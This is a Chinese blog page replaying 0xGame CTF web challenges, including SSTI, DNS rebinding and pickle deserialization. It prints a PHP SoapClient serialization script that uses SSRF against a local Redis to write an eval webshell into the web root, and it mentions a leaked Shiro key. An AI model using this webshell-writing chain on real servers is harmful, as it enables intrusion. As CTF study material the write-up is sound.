@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言部分题未做，部分题被卡住，复现一下，对于做题来讲还是有价值的(劣质复现WP)  web题大抵有几道题是老考点了，比如python原型链污染可看https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Article-kelp&#x2F;p&#x2F;17068716.html关于RCE的话还是老话，没WAF()大概就是打函数了有一道xxe的题目，知识点大概也就这么多，这道题都融了dtd打无回显+utf绕过 404NotFo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xgame部分题复现">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言部分题未做，部分题被卡住，复现一下，对于做题来讲还是有价值的(劣质复现WP)  web题大抵有几道题是老考点了，比如python原型链污染可看https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Article-kelp&#x2F;p&#x2F;17068716.html关于RCE的话还是老话，没WAF()大概就是打函数了有一道xxe的题目，知识点大概也就这么多，这道题都融了dtd打无回显+utf绕过 404NotFo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104183751613.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104175420615.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104182326261.png">
+<meta property="article:published_time" content="2025-11-04T10:25:05.000Z">
+<meta property="article:modified_time" content="2025-11-06T09:50:13.173Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104183751613.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>0xgame部分题复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/%E9%AB%98%E7%89%88%E6%9C%ACJDK%E4%B8%8B%E7%9A%84spring%E5%8E%9F%E7%94%9F%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/C3P0-%E9%93%BE%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&text=0xgame部分题复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&is_video=false&description=0xgame部分题复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0xgame部分题复现&body=Check out this article: https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&name=0xgame部分题复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&t=0xgame部分题复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">web题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%8A%B5"><span class="toc-number">2.1.</span> <span class="toc-text">大抵</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#404NotFound"><span class="toc-number">3.</span> <span class="toc-text">404NotFound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS"><span class="toc-number">4.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%AA%E6%B4%BC%E8%84%9A%E6%9C%AC"><span class="toc-number">5.</span> <span class="toc-text">爪洼脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%AC%E5%93%88%E9%B1%BC%E5%95%86%E5%BA%97"><span class="toc-number">6.</span> <span class="toc-text">马哈鱼商店</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#soapclient"><span class="toc-number">7.</span> <span class="toc-text">soapclient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">8.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        0xgame部分题复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-04T10:25:05.000Z" class="dt-published" itemprop="datePublished">2025-11-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>部分题未做，部分题被卡住，复现一下，对于做题来讲还是有价值的<br>(劣质复现WP) </p>
+<h2 id="web题"><a href="#web题" class="headerlink" title="web题"></a>web题</h2><h3 id="大抵"><a href="#大抵" class="headerlink" title="大抵"></a>大抵</h3><p>有几道题是老考点了，比如python原型链污染可看<code>https://www.cnblogs.com/Article-kelp/p/17068716.html</code><br>关于RCE的话还是老话，没WAF<code>()</code>大概就是打函数了<br>有一道xxe的题目，知识点大概也就这么多，这道题都融了<br>dtd打无回显+utf绕过</p>
+<h2 id="404NotFound"><a href="#404NotFound" class="headerlink" title="404NotFound"></a>404NotFound</h2><p>利用报错页面打ssti模板注入<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104183751613.png"></p>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>不知道DNS重绑定因此不会做()<br>有网站<br><code>https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code><br>随便能出了  </p>
+<h2 id="爪洼脚本"><a href="#爪洼脚本" class="headerlink" title="爪洼脚本"></a>爪洼脚本</h2><p>把一串特殊符号放进控制台执行，弹窗，按题干包裹即可  </p>
+<h2 id="马哈鱼商店"><a href="#马哈鱼商店" class="headerlink" title="马哈鱼商店"></a>马哈鱼商店</h2><p>实际做的时候改折扣没有用也是无语到了<br>这里打pickle反序列化，反弹shell即可<br>这里也可以subprocess\ncheck_output回显出来<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104175420615.png"></p>
+<h2 id="soapclient"><a href="#soapclient" class="headerlink" title="soapclient"></a>soapclient</h2><p>这道真想学的还是这个redis的打法<br>当时没有找到soapclient打redis<br>复现一下吧<br>脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$misc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pwn</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pure</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;web = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;misc = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET</span></span><br><span class="line"><span class="string">dbfilename sheep.php\r\nSET x &#x27;&lt;?= @eval(\$_POST[1]) ?&gt;&#x27;\r\nSAVE&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;crypto = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;hello\&quot;\r\n&quot;</span> . <span class="variable">$poc</span> . <span class="string">&quot;\r\nhello&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+<p>直接写入webshell了，拿flag即可<br>实际学习要看如何SSRF打redis，挺有意思的，SSRF稍微深一点到RCE还是得学</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>没啥东西其实，week3一道带密码以及略微猜谜的没写，week4投毒+shiro(渗透白打属实)没写，就这样吧，改进地方就是一些trick，以及css注入体系化的脚本改进吧  ，泄露出密钥<code>HnpH3v+x0v3HA4aMzoxDLQ==</code>直接打工具了<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251104182326261.png"></p>
+<hr>
+<p>这里利用工具去提取heapdump里面的Shirokey，打工具的时候记得勾选AES</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">web题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%8A%B5"><span class="toc-number">2.1.</span> <span class="toc-text">大抵</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#404NotFound"><span class="toc-number">3.</span> <span class="toc-text">404NotFound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS"><span class="toc-number">4.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%AA%E6%B4%BC%E8%84%9A%E6%9C%AC"><span class="toc-number">5.</span> <span class="toc-text">爪洼脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%AC%E5%93%88%E9%B1%BC%E5%95%86%E5%BA%97"><span class="toc-number">6.</span> <span class="toc-text">马哈鱼商店</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#soapclient"><span class="toc-number">7.</span> <span class="toc-text">soapclient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">8.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&text=0xgame部分题复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&is_video=false&description=0xgame部分题复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0xgame部分题复现&body=Check out this article: https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&title=0xgame部分题复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&name=0xgame部分题复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/0xgame%E9%83%A8%E5%88%86%E9%A2%98%E5%A4%8D%E7%8E%B0/&t=0xgame部分题复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
